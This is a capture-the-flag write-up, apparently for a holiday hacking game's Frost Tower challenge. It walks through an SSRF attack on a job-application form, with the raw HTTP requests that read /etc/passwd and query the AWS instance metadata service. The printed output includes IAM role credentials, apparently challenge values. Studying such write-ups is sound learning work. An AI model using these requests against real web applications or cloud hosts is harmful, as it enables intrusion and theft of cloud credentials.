(ch10)=
Frost Tower Challenge
=====================

After the embarassing talk with Noxious O.D'or in the CEO restroom (!) we arrived to the SSFR + IMDS challenge
<br/>you can find it here: [https://apply.jackfrosttower.com](https://apply.jackfrosttower.com)

docs available: 
<br/>[https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
<br/>[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)


## Mantra SSFR
```{admonition} Remember!
Dr. Petabyte told us, "anytime you see URL as an input, test for SSRF."
```

The first GET we tried was the one in home page required to apply for a position. 
<br/>[https://apply.jackfrosttower.com/?p=apply](https://apply.jackfrosttower.com/?p=apply)

and of course we love BurpSuite for the web challenges so  we [configure our browser](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) to pass through the proxy for our convenience (even if you can do everything just by using the browser)


Let's submit the Form Request and, of course, we try immediately the field `inputWorkSample` because Dr. Petabyte Docet !
```
GET /?inputName=aa&inputEmail=aa%40me.it&inputPhone=aa&inputField=Bedtime+violation&resumeFile=&inputWorkSample=file:///etc/passwd&additionalInformation=bbb&submit= HTTP/2
Host: apply.jackfrosttower.com
User-Agent: This field can be used like the "Evil Bit" 2.0. Absolutely NOT malicious! 
User-Agent: This field can be used like the "Evil Bit" 2.0 
```

<br>
after submitting the HTTP Request, we receive a curious enough Response HTML page 
in which we see again 3 images, but one of them seems broken. <br/>

![broken image](images/frost-web-apply.png)


By inspecting the HTML we see that the name of that image **is just the parameter we inserted as the parameter `inputName`**
```
<img class="rounded mx-auto d-block" src="images/aa.jpg" width="200px" />
```

and actually doing a curl on that image name it returns to us a real gift ..
```
$ curl https://apply.jackfrosttower.com/images/aa.jpg
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```
## Entry point SSFR
Ok. we've found the entry point for the SSFR and we now have to ask for the IMDS. We try http://169.254.169.254/latest/meta-data first

```
GET /?inputName=aa&inputEmail=aa%40me.it&inputPhone=aa&inputField=Bedtime+violation&resumeFile=&inputWorkSample=http://169.254.169.254/latest/meta-data&additionalInformation=
Host: apply.jackfrosttower.com
User-Agent: This field can be used like the "Evil Bit" 2.0. Absolutely NOT malicious! 
```

and see the results in our /images/aa.jpg so kindly offered :)
```
curl https://apply.jackfrosttower.com/images/aa.jpg
ami-id
ami-launch-index
ami-manifest-path
...(cutted).
iam/info
iam/security-credentials
iam/security-credentials/jf-deploy-role
instance-action
.....(cutted)
```

### SecretAccessKey
and if we applied what we learnt in the prechallenge about `IMDS 1` and `security-credentials`. 
```
GET /?inputName=aa&inputEmail=aa%40me.it&inputPhone=aa&inputField=Bedtime+violation&resumeFile=&inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&additionalInformation=
Host: apply.jackfrosttower.com
User-Agent: This field can be used like the "Evil Bit" 2.0. Absolutely NOT malicious! 
```
 
```
$ curl https://apply.jackfrosttower.com/images/aa.jpg
{
	"Code": "Success",
	"LastUpdated": "2021-05-02T18:50:40Z",
	"Type": "AWS-HMAC",
	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
	"Expiration": "2026-05-02T18:50:40Z"
}
```

Got it!
Done.

